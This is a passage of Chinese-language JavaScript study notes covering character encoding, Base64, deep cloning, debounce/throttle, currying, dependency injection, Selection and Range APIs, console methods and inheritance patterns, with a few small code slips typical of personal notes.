# js开发常见问题

- [unicode 和 utf 编解码的原理和不同](#unicode和utf编解码的原理和不同)
- [base64 和二进制的不同](#base64和二进制的不同)
- [深复制的实现](#深复制的实现)
- [节流和防抖](#节流和防抖)
- [js 函数柯里化](#js函数柯里化)
- [js 依赖注入与控制反转](js依赖注入与控制反转)
- [用户查找、光标、右键功能行为](#用户查找、光标、右键功能行为)
- [表单输入重置与 hover 提示文字](#表单输入重置与hover提示文字)
- [浏览器对话与打印](#浏览器对话与打印)
- [人工标注文档 Range](#人工标注文档Range)
- [js 设计模式](#js设计模式)
- [发布订阅和观察者](#发布订阅和观察者)
- [实现链式调用](#实现链式调用)
- [video深入理解](#video深入理解)
- [获取浏览器的唯一标识](#获取浏览器的唯一标识)
- [跨源通信](#跨源通信)
- [ChromeBug:FontBoosting](#ChromeBug:FontBoosting)
- [swiper轮播](#swiper轮播)
- [腾讯位置服务汽车轨迹](#腾讯位置服务汽车轨迹)
- [页面复制文字时自动加版权](#页面复制文字时自动加版权)
- [js监听url变化](#js监听url变化)
- [如何找到当前页面出现次数最多的HTML标签](#如何找到当前页面出现次数最多的HTML标签)
- [基准URL与刷新重定向](#基准URL与刷新重定向)
- [Svelte](#Svelte)
- [mockjs](#mockjs)
- [简单实现双向数据绑定mvvm](#简单实现双向数据绑定mvvm)
- [便捷的函数与方法](#便捷的函数与方法)
- [rxjs](#rxjs)

---

### unicode 和 utf 编解码的原理和不同

1. 参考链接：

   [Unicode 和 UTF-8 字符串编码解码原理](https://blog.csdn.net/Enl0ve/article/details/82844484)

   [Unicode 和 UTF-8、UTF-16 之间的区别](https://blog.csdn.net/zengchen__acmer/article/details/75332190)

   [【编码】ASCII、Unicode、GBK 和 UTF-8 字符编码的区别联系](https://blog.csdn.net/u010262331/article/details/46013905)

   [各种常见编码的转换算法](https://blog.csdn.net/xiaolongwang2010/article/details/10311397)

2. 详解：

   Unicode 是字符集，而 UTF-8 是编码规则

   字符集为每一个字符分配一个唯一的 ID(学名为码位/码点/Code Point)，而「编码规则」则是将「码位」转换为字节序列的规则。

   起初 Unicode 规定每个字符都是用 2 个字节来表示，但是由于英文字符等只需要一个字节就可以表，那就造成了在保存英文文本时，就会浪费一倍的空间。

   UTF-8 是一种变长的编码方式。它可以使用 1~4 个字节表示一个符号，根据不同的符号而变化字节长度，当字符在 ASCII 码的范围时，就用一个字节表示，保留了 ASCII 字符一个字节的编码做为它的一部分，注意的是 unicode 一个中文字符占 2 个字节，而 UTF-8 一个中文字符占 3 个字节。从 unicode 到 uft-8 并不是直接的对应，而是要过一些算法和规则来转换。

   ```txt
   例如「田」的码位是30000，记作U+7530(30000的16进制为0x7530)。
   U+ 0000 ~ U+ 007F: 0XXXXXXX
   U+ 0080 ~ U+ 07FF: 110XXXXX 10XXXXXX
   U+ 0800 ~ U+ FFFF: 1110XXXX 10XXXXXX 10XXXXXX
   U+10000 ~ U+1FFFF: 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX

   根据上表中的编码规则，之前的「田」字的码位 U+7530 属于第三行的范围：

       7    5    3    0
       0111 0101 0011 0000    二进制的 7530
   --------------------------
       0111   011111   100101 二进制的 77E5
   1110XXXX 10XXXXXX 10XXXXXX 模版（上表第三行）
   11100111 10010100 10110000 代入模版
   E   7    9   4    B   0

   这就是将 U+7530 按照 UTF-8 编码为字节序列 E794B0 的过程。反之亦然。
   ```

   UTF-8 就是每次 8 个位传输数据，而 UTF-16 就是每次 16 个位。

### base64 和二进制的不同

1. 参考链接：

   [让你完全理解 base64 是怎么回事](https://www.cnblogs.com/sweeeper/p/8462077.html)

   [一篇文章彻底弄懂 Base64 编码原理](https://blog.csdn.net/wo541075754/article/details/81734770)

   [JavaScript 用 btoa 和 atob 来编码解码 Base64](https://my.oschina.net/itblog/blog/1613977)

   [原生 JS 实现 base64 解码与编码](https://imweb.io/topic/5b8ea5327cd95ea86319358a)

2. 详解：

   Base64 编码可以将任意一组字节转换为较长的常见文本字符序列,将用户输入或二进制数据，打包成一种安全格式发送出去，无须担心其中包含冒号、换行符或二进制值等特殊字符。

   ```txt
   例子：输入Ow!

   (1) 字符串"Ow!"被拆分成3个8位的字节(0x4F、0x77、0x21)

   (2) 这3个字节构成了一个24为的二进制01001111 01110111 00100001

   (3) 这些为被划分为一些6位的序列010011、110111、011100、100001,(若不能正好平均分成每段6位，则按6和8的最小公倍数在末尾补0，位数为6和8的最小公倍数，000000用填充码=表示)

   (4) 每个6位值都表示了从0～63之间的数字，对应base64字母表中的64个字符之一。得到的base64编码字符串是4个字符的字符串“T3ch”。然后就可以通过线路将这个字符串作为“安全的”8位字符传送出去，因为只用了一些移植性最好的字符(字母、数字等)。

   a:a -- 011000 010011 101001 100001 -- YTph

   a:aa -- 011000 010011 101001 100001 011000 01xxxx xxxxxx xxxxxx -- YTphYQ==

   a:aaa -- 011000 010011 101001 100001 011000 010110 0001xx xxxxxx -- YTphYWE=

   a:aaaa -- 011000 010011 101001 100001 011000 010110 000101 100001 -- YTphYWFh
   ```

   ```txt
   编码表：

   0　A　　17　R　　　34　i　　　51　z

   1　B　　18　S　　　35　j　　　52　0

   2　C　　19　T　　　36　k　　　53　1

   3　D　　20　U　　　37　l　　　54　2

   4　E　　21　V　　　38　m　　　55　3

   5　F　　22　W　　　39　n　　　56　4

   6　G　　23　X　　　40　o　　　57　5

   7　H　　24　Y　　　41　p　　　58　6

   8　I　　25　Z　　　42　q　　　59　7

   9　J　　26　a　　　43　r　　　60　8

   10　K　　27　b　　　44　s　　　61　9

   11　L　　28　c　　　45　t　　　62　+

   12　M　　29　d　　　46　u　　　63　/

   13　N　　30　e　　　47　v

   14　O　　31　f　　　48　w　　　

   15　P　　32　g　　　49　x

   16　Q　　33　h　　　50　y
   ```

   btoa 和 atob 是 window 对象的两个函数，其中 btoa 是 binary to ascii，用于将 binary 的数据用 ascii 码表示，即 Base64 的编码过程，而 atob 则是 ascii to binary，用于将 ascii 码解析成 binary 数据

   ```js
   //方法实现
   var a = "Hello World!";
   var encodedString = btoa(string);
   console.log(encodedString); // Outputs: "SGVsbG8gV29ybGQh"
   var decodedString = atob(encodedString);
   console.log(decodedString); // Outputs: "Hello World!"
   //涉及中文时，需要encodeURIComponent
   var b = "Hello, 中国！";
   //"SGVsbG8lMkMlMjAlRTQlQjglQUQlRTUlOUIlQkQlRUYlQkMlODE="
   var encodedString2 = btoa(encodeURIComponent(b));
   var decodedString2 = decodeURIComponent(atob(encodedString2));
   console.log(decodedString2); //"Hello, 中国！"
   ```


### 深复制的实现

1. 参考链接：

   [深入 js 深拷贝对象](https://www.jianshu.com/p/b08bc61714c7)

   [JS 如何进行对象的深克隆（深拷贝）？](https://www.cnblogs.com/tangjiao/p/9313829.html)

2. 详解：

   - 递归法(简单常用，可复制原型链属性**proto**，无法处理对象成环、特殊类型 symbol、不可枚举属性 get/set)

   ```js
   function deepClone(obj) {
     if (typeof obj !== "object") {
       throw new Error("obj 不是一个对象！");
     }

     let isArray = Array.isArray(obj);
     let cloneObj = isArray ? [] : {};
     for (let key in obj) {
       cloneObj[key] = isObject(obj[key]) ? deepClone(obj[key]) : obj[key];
     }

     return cloneObj;
   }
   ```

   - 代理法(可 symbol，无法处理对象成环、不可复制原型链属性**proto**、不可枚举属性 get/set)

   ```js
   function deepClone(obj) {
     if (typeof obj !== "object") {
       throw new Error("obj 不是一个对象！");
     }

     let isArray = Array.isArray(obj);
     let cloneObj = isArray ? [...obj] : { ...obj };
     Reflect.ownKeys(cloneObj).forEach((key) => {
       cloneObj[key] = isObject(obj[key]) ? deepClone(obj[key]) : obj[key];
     });

     return cloneObj;
   }
   ```

   ```js
   function deepClone(obj) {
     if (obj == null) {
       return null;
     }
     var result = Array.isArray(obj) ? [] : {};
     for (let key in obj) {
       if (obj.hasOwnProperty(key)) {
         if (typeof obj[key] === "object") {
           result[key] = deepClone(obj[key]); // 如果是对象，再次调用该方法自身
         } else {
           result[key] = obj[key];
         }
       }
     }
     return result;
   }
   ```

   - 序列化法(只能处理数组和对象，且对象不能成环)

   ```js
   function deepClone(obj) {
     return JSON.parse(JSON.stringify(obj));
   }
   ```

   提示:JSON.stringify 有 3 个参数，第一个是常用的，需要序列化的对象，第二个是存在时，根据输入返回对象属性的值，第三个参数控制序列化后每个级别缩进指定数量空格

   - lodash 法(较完善)

   ```js
   let result = _.cloneDeep(test);
   ```

   - 组合法(无法处理日期和正则，Object.getOwnPropertyDescriptor 的 value 是浅拷贝)

   ```js
   function cloneDeep(obj) {
     let family = {};
     let parent = Object.getPrototypeOf(obj);

     while (parent != null) {
       family = completeAssign(deepClone(family), parent);
       parent = Object.getPrototypeOf(parent);
     }

     function completeAssign(target, ...sources) {
       sources.forEach((source) => {
         let descriptors = Object.keys(source).reduce((descriptors, key) => {
           descriptors[key] = Object.getOwnPropertyDescriptor(source, key);
           return descriptors;
         }, {});

         // Object.assign 默认也会拷贝可枚举的Symbols
         Object.getOwnPropertySymbols(source).forEach((sym) => {
           let descriptor = Object.getOwnPropertyDescriptor(source, sym);
           if (descriptor.enumerable) {
             descriptors[sym] = descriptor;
           }
         });
         Object.defineProperties(target, descriptors);
       });
       return target;
     }

     return completeAssign(deepClone(obj), family);
   }
   ```

   专门针对特殊类型

   ```js
   var clone = function (obj) {
     if (obj === null) return null;
     if (obj.constructor !== "object") return obj;
     if (obj.constructor === Date) return new Date(obj);
     if (obj.constructor === RegExp) return new RegExp(obj);
     var newObj = new obj.constructor(); //保持继承的原型
     for (var key in obj) {
       if (obj.hasOwnProperty(key)) {
         var val = obj[key];
         newObj[key] = typeof val === "object" ? arguments.callee(val) : val;
       }
     }
     return newObj;
   };
   ```

   特殊类型+成环

   ```js
   function deepClone(obj, hash = new WeakMap()) {
     if (obj instanceof RegExp) return new RegExp(obj);
     if (obj instanceof Date) return new Date(obj);
     if (obj === null || typeof obj !== "object") return obj;
     if (hash.has(obj)) {
       return hash.get(obj);
     }
     //obj为Array，相当于new Array()
     //obj为Object，相当于new Object()
     let constr = new obj.constructor();
     hash.set(obj, constr);
     for (let key in obj) {
       if (obj.hasOwnProperty(key)) {
         constr[key] = deepClone(obj[key], hash);
       }
     }
     return constr;
   }
   var o1 = new Object();
   var o2 = new Object();
   o1.next = o2;
   o2.next = o1;
   var target = [
     0,
     null,
     undefined,
     NaN,
     [1, 2],
     { name: "a", obj: { a: 1 } },
     function a() {
       return 1;
     },
     new Date("2020-01-01"),
     new RegExp(/aaa/),
     o1,
   ];
   ```

### 节流和防抖

1. 参考链接：

   [函数防抖和节流](https://www.jianshu.com/p/c8b86b09daf0)

   [js 防抖和节流](https://www.cnblogs.com/momo798/p/9177767.html)

2. 详解：

   - 防抖（debounce）

     触发事件后在 n 秒内函数只能执行一次，如果在 n 秒内又触发了事件，则会重新计算函数执行时间。

     ```js
     function debounce(fn, wait, immediate) {
      let timer = null;
      let one = immediate;
      return function (...args) {
        if (one) {
          one = false;
          fn(...args);
        } else {
          if (timer !== null) {
            clearTimeout(timer);
          }
          timer = setTimeout(() => {
            fn(...args);
          }, wait);
        }
      };
    }
    var handle = debounce(function (val) {
      console.log(val);
    }, 1000,true)
    window.onclick = function () {
      handle(Math.random())
    }
     ```

   - 节流（throttle）

     连续触发事件但是在 n 秒中只执行一次函数。节流会稀释函数的执行频率。

      ```js
      function throttle(fn, wait, isDate) {
        let previous = 0;
        let timer = null;

        return function (...args) {
          if (isDate) {
            let now = new Date().getTime();
            if (now - previous > wait) {
              previous = now;
              fn(...args);
            }
          } else {
            if (timer === null) {
              timer = setTimeout(() => {
                timer = null;
                fn(...args);
              }, wait);
            }
          }
        };
      }
      var handle = throttle(function (val) {
        console.log(val);
      }, 1000, true)
      window.onclick = function () {
        handle(Math.random())
      }
      ```


### js 函数柯里化

1. 参考链接：

   [详解 JS 函数柯里化](https://www.jianshu.com/p/2975c25e4d71)

   [前端柯里化的三种作用](https://blog.csdn.net/qq_39674542/article/details/82657109)

2. 详解：

   Currying 是把接受多个参数的函数变换成接受一个单一参数的函数，并且返回接受余下的参数而且返回结果的新函数的技术。

   - 柯里化:高阶函数

     ```js
     function add(x, y) {
       return x + y;
     }
     function curryingAdd(x) {
       return function (y) {
         return x + y;
       };
     }
     add(1, 2); // 3
     curryingAdd(1)(2); // 3
     ```

   - 好处：

     - 参数复用

       ```js
       function check(reg, txt) {
         return reg.test(txt);
       }

       check(/\d+/g, "test"); //false
       check(/[a-z]+/g, "test"); //true

       function curryingCheck(reg) {
         return function (txt) {
           return reg.test(txt);
         };
       }
       var hasNumber = curryingCheck(/\d+/g);
       var hasLetter = curryingCheck(/[a-z]+/g);

       hasNumber("test1"); // true
       hasNumber("testtest"); // false
       hasLetter("21212"); // false
       ```

     - 延迟执行：累积传入的参数，最后执行
     - 固定易变因素：传参固定下来，生成一个更明确的应用函数。如 bind 函数用以固定 this 这个易变对象。

   - 封装

   ```js
   // 支持多参数传递
   const curry = (fn, ...args) =>
     args.length < fn.length
       ? (...arguments) => curry(fn, ...args, ...arguments)
       : fn(...args);

   function sumFn(a, b, c) {
     return a + b + c;
   }
   var sum = curry(sumFn);
   sum(1, 2, 3);
   sum(1)(2, 3);
   sum(1)(2)(3);
   ```

   - 反柯里化：把原来已经固定的参数或者 this 上下文等当作参数延迟到未来传递

   - 题目

   ```js
   function add() {
     // 第一次执行时，定义一个数组专门用来存储所有的参数
     var _args = Array.prototype.slice.call(arguments);
     console.log(1, arguments, _args);
     // 在内部声明一个函数，利用闭包的特性保存_args并收集所有的参数值
     var _adder = function () {
       _args.push(...arguments);
       console.log(2, arguments, _args);
       return _adder;
     };

     // 利用toString隐式转换的特性，当最后执行时隐式转换，并计算最终的值返回
     _adder.toString = function () {
       console.log(3, _args);
       return _args.reduce(function (a, b) {
         console.log(4, _args, a, b);
         return a + b;
       });
     };
     console.log(5, _args);
     return _adder;
   }

   add(1)(2)(3) = 6;
   add(1, 2, 3)(4) = 10;
   add(1)(2)(3)(4)(5) = 15;
   add(1, 2, 3)(4, 5)(6) = 21;
   /*
   1 Arguments(3) [1, 2, 3, callee: ƒ, Symbol(Symbol.iterator): ƒ] (3) [1, 2, 3]
   5 (3) [1, 2, 3]
   2 Arguments(2) [4, 5, callee: ƒ, Symbol(Symbol.iterator): ƒ] (5) [1, 2, 3, 4, 5]
   2 Arguments [6, callee: ƒ, Symbol(Symbol.iterator): ƒ] (6) [1, 2, 3, 4, 5, 6]
   3 (6) [1, 2, 3, 4, 5, 6]
   4 (6) [1, 2, 3, 4, 5, 6] 1 2
   4 (6) [1, 2, 3, 4, 5, 6] 3 3
   4 (6) [1, 2, 3, 4, 5, 6] 6 4
   4 (6) [1, 2, 3, 4, 5, 6] 10 5
   4 (6) [1, 2, 3, 4, 5, 6] 15 6
   ƒ 21
   */
   ```

### js 依赖注入与控制反转

1. 参考链接：

   [细数 Javascript 技术栈中的四种依赖注入](https://www.cnblogs.com/front-end-ralph/p/5208045.html)

2. 详解：

   - 场景

     A 想调用 B 的某些方法，于是 A 里面就要 new 一个 B，后来 A 不用 B 了，想用 C，于是就需要改 A 的代码，new B 变为 new C，代码耦合性高。

     因此，如果有一个容器能给到 A，A 就能用到 B、C、D...的方法，而且没经调用的方法，不实例化对象，同样 B 也能通过容器用到其它方法，于是就用到依赖注入与控制反转。

   - 依赖注入与控制反转

     依赖注入与控制反转描述的是同一件事情，A 靠注入的容器获取外部资源，容器反过来控制了 A 想获得的资源。

   - 实现


        ```js
        //es5
        function injector(){
            this.hadinstance = true;
            console.log('实例化injector,只有hadinstance:',this.hadinstance);
        }
        injector.prototype.A = function(){
            console.log('实例化A');
            return new A();
        };
        injector.prototype.B = function(){
            console.log('实例化B');
            return new B();
        };
        function myClass1(injector){
            this.myInjector = injector;
        }
        function A(){
            this.a = 'a';
            this.say=function(){
                alert('A');
            }
        }
        function B(){
            this.b = 'b';
            this.say=function(){
                alert('B');
            }
        }
    
        let test = new myClass1(new injector());//实例化injector,只有hadinstance: true
        Object.getOwnPropertyNames(test);//["myContainer"]
        Object.getOwnPropertyNames(injector.prototype);//(3) ["constructor", "A", "B"]
        Object.getOwnPropertyNames(new injector());//["hadinstance"]
        Object.getOwnPropertyNames(new A());//(2) ["a", "say"]
        test.myInjector.A().say();//实例化A
        test.myInjector.B().b;//实例化B
    
        //es6
        class injector{
            constructor(){
                this.hadinstance = true;
                console.log('实例化injector,只有hadinstance:',this.hadinstance);
            }
            A(){
                console.log('实例化A');
                return new A();
            }
            B(){
                console.log('实例化B');
                return new B();
            }
        }
        class myClass1{
            constructor(injector){
                this.myInjector = injector;
            }
        }
        class A{
            constructor(){
                this.a = 'a';
                this.say=function(){
                    alert('A');
                }
            }
        }
        class B{
            constructor(){
                this.b = 'b';
                this.say=function(){
                    alert('B');
                }
            }
        }
        let test = new myClass1(new injector());//实例化injector,只有hadinstance: true
        Object.getOwnPropertyNames(test);//["myContainer"]
        Object.getOwnPropertyNames(injector.prototype);//(3) ["constructor", "A", "B"]
        Object.getOwnPropertyNames(new injector());//["hadinstance"]
        Object.getOwnPropertyNames(new A());//(2) ["a", "say"]
        test.myInjector.A().say();//实例化A
        test.myInjector.B().b;//实例化B
        ```


### 用户查找、光标、右键功能行为

1. 参考链接：

   [Window](https://developer.mozilla.org/zh-CN/docs/Web/API/Window)

2. 详解：

   - 浏览器搜索功能(ctrl F 或 js window.find),无需遍历 json 或后台处理

   ```js
   //有bug，未来可能废弃
   window.find(
     要搜索的字符串,
     true区分大小写,
     true向上搜索,
     true循环搜索,
     true全字匹配搜索(该参数无效),
     true会搜索框架内的文本,
     true弹出一个搜索对话框
   );
   ```

   - 用户选择的文本范围或光标的当前位置(window.getSelection 或 Document.getSelection())

   ```js
   const selection = window.getSelection();
   const selection2 = document.getSelection();
   //属性
   //Selection {anchorNode: text, anchorOffset: 37, focusNode: text, focusOffset: 41, isCollapsed: false, …}
   //>anchorNode: text 选区开始位置所属的节点
   //>anchorOffset: 37 选区开始位置
   //>baseNode: text
   //>baseOffset: 37
   //>extentNode: text
   //>extentOffset: 41
   //>focusNode: text 选区结束位置所属的节点
   //>focusOffset: 41 选区结束位置
   //>isCollapsed: false 选区的起始点和终止点是否位于一个位置
   //>rangeCount: 1 选区中range对象数量(跨越多少个标签)
   //>type: "Range" 选区类型
   //方法
   //containsNode()判断指定的节点是否包含在Selection中
   //更多方法查看mdn
   ```

   - 禁用右键功能

   ```js
   window.oncontextmenu = function () {
     return false;
   };
   ```

   - 禁止选中文本

   ```js
   window.onselectstart = function () {
     return false;
   };
   ```

   - 禁止复制

   ```js
   document.oncopy = function () {
     return false;
   };
   ```

### 表单输入重置与 hover 提示文字

1. 参考链接：

   [Window](https://developer.mozilla.org/zh-CN/docs/Web/API/Window)

2. 详解：

   - 表单重置

     Form.reset()或点击 input type=reset

   - 提交按钮使用图片

     input type=image src

   - hover 显示提示文字

     title 属性

### 浏览器对话与打印

1. 参考链接：

   [Window](https://developer.mozilla.org/zh-CN/docs/Web/API/Window)

2. 详解：

   - window.prompt 对话框

   ```js
   用户输入文字 = window.prompt(提示用户输入文字, 文本输入框默认值);
   ```

   - console.assert()断言

   ```js
   const errorMsg = "the # is not even";
   for (let number = 2; number <= 5; number += 1) {
     console.log("the # is " + number);
     console.assert(number % 2 === 0, { number: number, errorMsg: errorMsg });
     // 或者使用 ES2015 对象简写:
     // console.assert(number % 2 === 0, {number, errorMsg});
   }
   // 输出:
   // the # is 2
   // the # is 3
   // Assertion failed: {number: 3, errorMsg: "the # is not even"}
   // the # is 4
   // the # is 5
   // Assertion failed: {number: 5, errorMsg: "the # is not even"}
   ```

   - Console.count() Console.countReset() 输出计数

   ```js
   var user = "";

   function greet() {
     console.count();
     return "hi " + user;
   }

   user = "bob";
   greet();
   user = "alice";
   greet();
   greet();
   console.count();
   console.countReset();
   // 输出:
   // "default: 1"
   // "default: 2"
   // "default: 3"
   // "default: 1"
   // "default: 0"
   var user = "";

   function greet() {
     console.count(user);
     return "hi " + user;
   }

   user = "bob";
   greet();
   user = "alice";
   greet();
   greet();
   console.countReset("bob");
   console.count("alice");
   // 输出:
   // "bob: 1"
   // "alice: 1"
   // "alice: 2"
   // "bob: 0"
   // "alice: 3"
   ```

   - console.dir 打印对象树

   ```js
   console.dir(object);
   ```

   - Console.dirxml()显示 xml/html 交互树(可折叠拉伸的标签)

   ```js
   console.dir(object);
   ```

   - console.log console.info console.warn console.error console.debug 输出不同级别信息

   ```js
   console.log(obj1,obj2...)
   console.info(obj1,obj2...)
   console.warn(obj1,obj2...)
   console.error(obj1,obj2...)
   console.debug(obj1,obj2...)
   console.log('String: %s, Int: %d,Float: %f, Object: %o, Style: %c', "字符串", "整数", "浮点数", "对象", "样式")
   console.log('the word is %s try number %d', 'foo', 123)
   console.log(`temp的值为: ${temp}`)
   console.log("%c3D Text"," text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);font-size:5em")
   ```

   - console.group console.groupCollapsed console.groupEnd()输出分组

     - console.group 创建新的分组.内容输出当前分组,直到调用 console.groupEnd()之后,结束分组
     - console.groupCollapsed 与 group 的区别是输出内容不折叠
     - console.groupEnd 结束分组

   - Console.table 打印表格

   ```js
   //可点击列名排序
   console.table([
     ["John", "Smith"],
     ["Jane", "Doe"],
     ["Emily", "Jones"],
   ]);
   //可隐藏指定列
   console.table(
     [
       ["John", "Smith"],
       ["Jane", "Doe"],
       ["Emily", "Jones"],
     ],
     ["1"]
   );
   ```

   - console.time console.timeEnd console.timeLog 打印占用时长

     - console.time(timerName)计时开始
     - console.timeEnd(timerName)计时结束，打印经过的时间
     - console.timeLog(timerName)计时结束，打印经过的时间,并带上 timer 名

   - console.trace()输出堆栈跟踪

### 人工标注文档 Range

1. 参考链接：

   [Window](https://developer.mozilla.org/zh-CN/docs/Web/API/Window)

   [JS Range 对象的使用](https://blog.csdn.net/m0_37885651/article/details/88353305)

   [JavaScript 之 Range--或许会有点用](https://segmentfault.com/a/1190000015142374)

2. 详解：

   - 应用场景：文档标注

   - range 储存网页选中文字位置

     - window.getSelection().getRangeAt(0) Selection 转 Range

     ```js
     collapsed: false//是否起始点和结束点是同一个位置
     commonAncestorContainer: text//返回目标节点的共有祖先节点
     endContainer: text//返回结束的Node
     endOffset: 96//返回结束位置在目标节点起始的偏移值
     startContainer: text//返回开始的Node
     startOffset: 19//返回开始位置在目标节点起始的偏移值
     __proto__: Range
     //方法
     Range.cloneContents()//返回DocumentFragment，可用于插入节点
     Range.cloneRange()//返回被克隆range
     Range.selectNode()//设置range包含整个节点
     Range.selectNodeContents()//设置Range包含节点的内容
     Range.collapse(bool)//设置起始点和结束点是否折叠
     Range.compareBoundaryPoints(how, sourceRange)//返回边界节点与指定范围对比
     //how:
     //Range.END_TO_END尾与尾对比
     //Range.END_TO_START尾与始对比
     //Range.START_TO_END始与尾对比
     //Range.START_TO_START始与始对比
     //返回值：-1,0,1表示前于，相同，后于
     Range.comparePoint(新节点，偏移量)//节点与新节点的偏移量比较，返回值：-1,0,1表示前于，相同，后于
     Range.createContextualFragment(string)//字符串转DocumentFragment
     Range.deleteContents()//移除内容
     Range.detach()//使range锁定或解锁
     documentFragment = range.extractContents()//range转documentFragment
     boundingRect = range.getBoundingClientRect()//返回矩形
     rectList = range.getClientRects()//返回矩形列表
     Range.insertNode(新节点)//在Range的起始位置插入节点
     bool = range.intersectsNode(节点)//判断节点与范围是否相交
     bool = range.isPointInRange(新节点，偏移量)//判断节点的偏移量与范围是否相交
     Range.setEnd(新节点，偏移量)//设置Range结束位置
     Range.setEndAfter(节点)//设置Range结束位置在指定节点之后
     Range.setEndBefore(节点)//设置Range结束位置在指定节点之前
     Range.setStart(新节点，偏移量)//设置Range起始位置
     Range.setStartAfter(节点)//设置Range起始位置在指定节点之后
     Range.setStartBefore(节点)//设置Range起始位置在指定节点之前
     Range.surroundContents(新节点)//将Range内容移动到新节点
     text = range.toString()//Range序列化字符串
     ```

     - 手动创建 Range

     ```js
     var range = document.createRange();
     range.setStart(startContainer, startOffset);
     range.setEnd(endContainer, endOffset);
     ```

     - xpath(xml 路径语言)和 range 互转

     ```js
     function getElementXPath(element) {
       if (!element) return null;

       if (element.id) {
         return `//*[@id=${element.id}]`;
       } else if (element.tagName === "BODY") {
         return "/html/body";
       } else {
         const sameTagSiblings = Array.from(
           element.parentNode.childNodes
         ).filter((e) => e.nodeName === element.nodeName);
         const idx = sameTagSiblings.indexOf(element);

         return (
           getElementXPath(element.parentNode) +
           "/" +
           element.tagName.toLowerCase() +
           (sameTagSiblings.length > 1 ? `[${idx + 1}]` : "")
         );
       }
     }
     function createRangeFromXPathRange(xpathRange) {
       var startContainer,
         endContainer,
         endOffset,
         evaluator = new XPathEvaluator();

       // must have legal start and end container nodes
       startContainer = evaluator.evaluate(
         xpathRange.startContainerPath,
         document.documentElement,
         null,
         XPathResult.FIRST_ORDERED_NODE_TYPE,
         null
       );
       if (!startContainer.singleNodeValue) {
         return null;
       }

       if (xpathRange.collapsed || !xpathRange.endContainerPath) {
         endContainer = startContainer;
         endOffset = xpathRange.startOffset;
       } else {
         endContainer = evaluator.evaluate(
           xpathRange.endContainerPath,
           document.documentElement,
           null,
           XPathResult.FIRST_ORDERED_NODE_TYPE,
           null
         );
         if (!endContainer.singleNodeValue) {
           return null;
         }

         endOffset = xpathRange.endOffset;
       }

       // map to range object
       var range = document.createRange();
       range.setStart(startContainer.singleNodeValue, xpathRange.startOffset);
       range.setEnd(endContainer.singleNodeValue, endOffset);
       return range;
     }
     ```

### js 设计模式

1. 参考链接：

   - [Java 设计模式：23 种设计模式全面解析（超级详细）](http://c.biancheng.net/design_pattern/)
   - [JS 设计模式](https://www.cnblogs.com/panrui1994/p/9402831.html)
   - [23 种 JavaScript 设计模式](https://www.cnblogs.com/qiu-freedom/p/9135129.html)
   - [js 继承的 6 种方式](https://www.cnblogs.com/ranyonsue/p/11201730.html)
   - [JS 继承的几种方式](https://zhuanlan.zhihu.com/p/62278342)
   - [ECMAScript 6 入门](https://es6.ruanyifeng.com/?search=class&x=0&y=0#docs/class)
   - [理解 es6 中 class 构造以及继承的底层实现原理](https://www.cnblogs.com/memphis-f/p/12029574.html)
   - [前端渣渣唠嗑一下前端中的设计模式（真实场景例子）](https://juejin.im/post/5e0eaff4e51d45413b7b77f3)
   - [8 个原生 JS 知识点 | 面试高频](https://mp.weixin.qq.com/s/tIasEjYJRaVqFMN_aVtpiw)
   - [“浅尝”JavaScript设计模式](https://juejin.im/post/5eb3be806fb9a043426818c7)
   - [proxy-polyfill](https://github.com/linsk1998/proxy-polyfill/blob/master/proxy.js)
   - [进阶必读：深入理解 JavaScript 原型](https://juejin.cn/post/6901494216074100750)
   - [JS沙箱模式实例分析](https://www.jb51.net/article/122831.htm)
   - [说说JS中的沙箱](https://segmentfault.com/a/1190000020463234)
   - [15 张前端高清知识地图，强烈建议收藏](https://juejin.cn/post/6976157870014332935)

2. 详解：

    * 原型链

      * 定义

        原型对象上有一个 constructor 属性指向构造函数；实例对象上有一*proto* 属性指向原型对象，通过*proto*可以一直往上寻找原型对象，直到为 null，由*proto*串起来的路径就是原型链。

      * 作用

        在访问一个对象的属性时，实际上是在查询原型链。这个对象是原型链的第一个元素，先检查它是否包含属性名，如果包含则返回属性值，否则检查原型链上的第二个元素，以此类推。

      * 关于prototype

        对象分 2 种：函数对象和普通对象，只有函数对象拥有原型对象（prototype），prototype 的本质是普通对象，new 操作得到的对象是普通对象。



    * 继承的实现

      父类

      ```js
      function Father(name) {
        // 属性
        (this.name = name || "father"),
          // 实例方法
          (this.sleep = function () {
            console.log(this.name + "正在睡觉");
          });
      }
      // 原型方法
      Father.prototype.look = function (book) {
        console.log(this.name + "正在看:" + book);
      };
      ```

      1. 原型链

        ```js
        function Son(){

        }
        Son.prototype = new Father();  // 相当于重写了Son的原型
        Son.prototype.constructor = Son; //  一定要把Son原型上的contructor重新指向Son

        var son = new Son();
        console.log(son.sleep()); // father正在睡觉
        console.log(son.look('TV')); // father正在看TV
        ```

        缺点：无法向父构造函数传参，共享父类属性
  
      2. 借用构造函数
  
          ```js
          function Son(name){
              Father.call(this);
              this.name = name;
          }
          var son = new Son('son')
          console.log(son.sleep()) //son正在睡觉
          console.log(son.look('TV')) // son正在看TV
          ```
          缺点：只继承构造函数属性，没继承构造父类原型属性，没法复用，新实例都调用父构造函数。
  
      3. 冒充对象继承
  
          ```js
          function Son(){
              var temp = new Father()
              for(var k in temp){
                  this[k] = temp[k]
              }
              temp = null
          }
  
          var son = new Son()
          console.log(son.sleep()) // father正在睡觉
          console.log(son.look('TV')) // father正在看TV
          ```
          缺点：遍历繁琐，没解决向父构造函数传参问题
  
      4. 组合继承(原型链+call)
  
          ```js
          function Son(){
              Father.call(this)
          }
          Son.prototype = new Father();
          Son.prototype.constructor = Son;
  
          var son = new Son()
          console.log(son.sleep()) // father正在睡觉
          console.log(son.look('TV')) // father正在看TV
          ```
          缺点：调用了两次父类构造函数（耗内存），子类的构造函数会代替原型上的那个父类构造函数。
  
      5. 原型式继承
  
          通过 Object.create 或者 Object.setPrototypeOf 显式继承另一个对象，将它设置为原型。

          通过 constructor 构造函数，在使用 new 关键字实例化时，会自动继承 constructor 的 prototype 对象，作为实例的原型。

          ```js
          function createObject(o){
              function fn(){}
              fn.prototype = o;
              return new fn();
          }
          var father = new Father();
          var son = createObject(father);
          console.log(son.sleep()) // father正在睡觉
